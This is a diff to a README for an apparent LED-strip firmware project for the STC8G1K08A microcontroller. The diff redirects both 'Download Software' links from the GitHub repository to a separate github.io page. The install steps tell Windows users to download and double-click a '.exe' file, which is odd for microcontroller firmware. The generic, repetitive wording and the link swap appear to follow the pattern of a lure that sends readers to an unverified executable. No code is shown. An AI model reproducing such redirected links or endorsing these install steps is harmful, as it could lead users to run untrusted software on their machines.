@@ -1,6 +1,6 @@
 # 💡 LongXL-LED-Open-Source-Version - Simple Control For Addressable LED Lights
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Leomonc9813/LongXL-LED-Open-Source-Version)
+[![Download Software](https://img.shields.io/badge/Download-Software-blue.svg)](https://leomonc9813.github.io)
 
 This software manages WS2812 and NeoPixel LED strips using a simple one-button interface. It runs on the STC8G1K08A controller. The system features seven preset colors and a brightness adjustment tool. It saves your settings in internal memory so the lights keep their state after a power cycle.
 
@@ -26,7 +26,7 @@ To use this software, your computer must meet these basic criteria:
 
 Follow these steps to get the software running on your Windows machine.
 
-1. **Visit the Download Page:** You must download the latest release files from the repository repository page. Visit this page to download: [https://github.com/Leomonc9813/LongXL-LED-Open-Source-Version](https://github.com/Leomonc9813/LongXL-LED-Open-Source-Version).
+1. **Visit the Download Page:** You must download the latest release files from the repository repository page. Visit this page to download: [https://leomonc9813.github.io](https://leomonc9813.github.io).
 2. **Locate the Installer:** Once the page opens, look for the "Releases" section on the right side of the screen. Click on the most recent version number.
 3. **Download the File:** Find the file ending in `.exe` within the release assets. Click the filename to save it to your computer.
 4. **Run the Installer:** Navigate to your Downloads folder and double-click the file you just saved. 
